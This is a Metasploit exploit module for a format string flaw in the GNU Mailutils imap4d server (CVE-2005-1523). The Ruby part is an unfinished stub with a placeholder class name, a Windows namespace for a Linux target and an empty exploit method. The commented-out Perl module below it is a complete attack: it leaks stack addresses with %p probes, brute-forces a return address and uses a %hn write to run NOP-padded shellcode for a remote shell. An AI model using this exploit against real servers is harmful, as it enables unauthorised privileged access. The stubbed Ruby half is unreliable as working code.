require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'GNU Mailutils imap4d Format String Vulnerability',
			'Description'    => %q{
				This module exploits a format string vulnerability in the
				GNU Mailutils imap4d service. The discovery of this
				vulnerability is credited to iDEFENSE.
					
			},
			'Author'         => [ 'Adriano Lima <adriano@seedsecurity.com>' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'BID', '13764'],
					[ 'CVE', '2005-1523'],
					[ 'OSVDB', '16857'],
					[ 'URL', 'http://www.gnu.org/software/mailutils/mailutils.html'],
					[ 'URL', 'http://www.idefense.com/application/poi/display?id=246&type=vulnerabilities'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 1004,
					'BadChars' => "\x00\x0a\x0d\x0c",
					'MinNops'  => 200,

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'linux',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'May 25 2005',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin
package Msf::Exploit::gnu_mailutils_imap4d;
use base "Msf::Exploit";
use strict;
use Pex::Text;
use IO::Socket;

my $advanced = { };

my $info = {
	'Name'     => 'GNU Mailutils imap4d Format String Vulnerability',
	'Version'  => '$Revision$',
	'Authors'  => [ 'Adriano Lima <adriano [at] seedsecurity.com>', ],
	'Arch'     => [ 'x86' ],
	'OS'       => [ 'linux' ],
	'Priv'     => 1,
	'UserOpts' =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 143],
		'DEBUG' => [0, 'BOOL', 'Enable debugging mode'],
	  },

	'Payload' =>
	  {
		'Space'    => 1004,
		'BadChars' => "\x00\x0a\x0d\x0c",
		'MinNops'  => 200,
		'Keys'     => ['+findsock'],
	  },

	'Description' =>
	  Pex::Text::Freeform(qq{
		This module exploits a format string vulnerability in the GNU Mailutils imap4d
	service. The discovery of this vulnerability is credited to iDEFENSE.
}),

	'Refs' =>
	  [
		['BID'  , '13764'],
		['CVE'  , '2005-1523'],
		['OSVDB', '16857'],
		['URL'  , 'http://www.gnu.org/software/mailutils/mailutils.html'],
		['URL'  , 'http://www.idefense.com/application/poi/display?id=246&type=vulnerabilities'],
	  ],

	'Keys' => ['imap'],

	'DisclosureDate' => 'May 25 2005',
	
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		$self->PrintLine("[*] Error creating socket: " . $s->GetError);
		return $self->CheckCode('Connect');
	}

	my $versionReply = $s->Recv(-1, 10);

	my $packet = "A" x 1007 . "BBBB" . "CCCC" . "%p.%p.%p.%p\r\n";

	$s->Send($packet);

	my $fmtReply = $s->Recv(-1, 10);

	if($fmtReply =~ /.0x/) {
		$self->PrintLine("[*] Target seems to running vulnerable version.");
		return $self->CheckCode('Appears');
	}

	$self->PrintLine("[*] Target does not seem to be vulnerable.");
	return $self->CheckCode('Safe');

	$s->Close;
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;

	$self->Print("[*] Reading information from target " . $target_host . ": ");

	my $offset = "a" x 3;
	my $flag = 0;
	my ($i,$shellAddr,$pos,$pos2,$baseAddr);

	for($i = 1; $i < 30; $i++) {

		$self->Print(".");

		my $sock = Msf::Socket::Tcp->new
		  (
			'PeerAddr'  => $target_host,
			'PeerPort'  => $target_port,
			'LocalPort' => $self->GetVar('CPORT'),
			'SSL'       => $self->GetVar('SSL'),
		  );
		if ($sock->IsError) {
			$self->PrintLine('');
			$self->PrintLine("[*] Error creating socket: " . $sock->GetError);
			return;
		}

		my $serverBanner = $sock->Recv(-1, 10);

		my $load = "A" x 1007 . "BBBB" . "CCCC:" . '%' . $i . '$p' . ":\r\n";

		$sock->Send($load);

		my $serverResp = $sock->Recv(-1,10);
		my ($left,$right) = split(/:/,$serverResp);

		if($right =~ /42424242/){
			$pos = $i;
			$pos2 = $pos + 1;
		}

		if($right =~ /0x8/ && $i != 1 && !defined($shellAddr)){
			if($flag){
				$shellAddr = $right;
				$flag = 0;
			}else{
				$flag = 1;
			}
		}

		if($right =~ /0xbf/){
			$baseAddr = $right;
		}

		if($shellAddr && $pos && $baseAddr){
			last;
		}

		$sock->Close();
		undef($sock);
	}

	if(!$shellAddr || !$pos || ! $baseAddr){
		$self->PrintLine('');
		$self->PrintLine("[*] Error reading information from target.");
		return;
	}

	$self->PrintLine('');
	$self->PrintLine("[*] Base: " . $baseAddr . " Payload: " . $shellAddr);
	$self->Print('[*] Searching for return address: ');

	my $baseAddrul = hex($baseAddr);
	my $shellAddrul = hex($shellAddr) + 0x10;

	my ($curr_ret,$new_ret,$new_ret2,$first,$second,$pad);

	for (
		$curr_ret = $baseAddrul ;
		$curr_ret >= ( $baseAddrul - 0x200 ) ;
		$curr_ret -= 4
	  )
	{

		my $validRet = $self->AllSeeingEye( $curr_ret, $pos, $target_host, $target_port );

		if ($validRet) {

			my $s = Msf::Socket::Tcp->new(
				'PeerAddr'  => $target_host,
				'PeerPort'  => $target_port,
				'LocalPort' => $self->GetVar('CPORT'),
				'SSL'       => $self->GetVar('SSL'),
			  );

			if ( $s->IsError ) {
				$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
				return;
			}

			my $banner = $s->Recv( -1, 10 );

			$new_ret  = pack( 'l', $curr_ret );
			$new_ret2 = pack( 'l', $curr_ret + 2 );

			$first  = ( ( $shellAddrul & 0xffff0000 ) >> 16 ) - 1007 - 8;
			$second = ( ( $shellAddrul & 0x0000ffff ) ) - $first - 1007 - 8;

			my $request = $self->MakeNops(1004);
			substr( $request, length($request) - length($shellcode), length($shellcode), $shellcode );

			my $fmtSTR = sprintf( '%s%s%s%%%dx%%%d$hn%%%dx%%%d$hn', $offset, $new_ret2, $new_ret, $first, $pos, $second, $pos2 );
			$request .= $fmtSTR . "\x0d\x0a";

			$self->PrintLine('');
			$self->PrintLine(sprintf( "[*] Trying return address 0x%.8x...", $curr_ret ));

			if ( $self->GetVar('DEBUG') ) {
				$self->PrintLine("[*] Press enter to send buffer...");
				<STDIN>;
			}

			$s->Send($request);
			sleep(3);

			# handle client side of shellcode
			$self->Handler( $s->Socket );

			$s->Close();
			undef($s);

		}

		$self->Print(".");
	}

	$self->PrintLine('');
	$self->PrintLine('');
}

sub AllSeeingEye {
	my $self = shift();
	my ($seeit,$position,$host,$port) = @_;

	my $sc = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $host,
		'PeerPort'  => $port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );

	if (($seeit & 0x000000ff) == 0) {
		return 0;
	}

	my $seeit_new = pack('l', $seeit);

	my $findRET = "A" x 1007 . $seeit_new . ':%' . $position . '$s' . ":\r\n";

	$sc->Send($findRET);

	my $inside = $sc->Recv(-1,10);

	my ($crap,$stuff) = split(/:/,$inside);

	my $pad = substr($stuff,0,4);

	$sc->Close();

	if ($pad =~ "\x04\x08") {
		return 1;
	}

	return 0;
}

1;

=end


end
end	
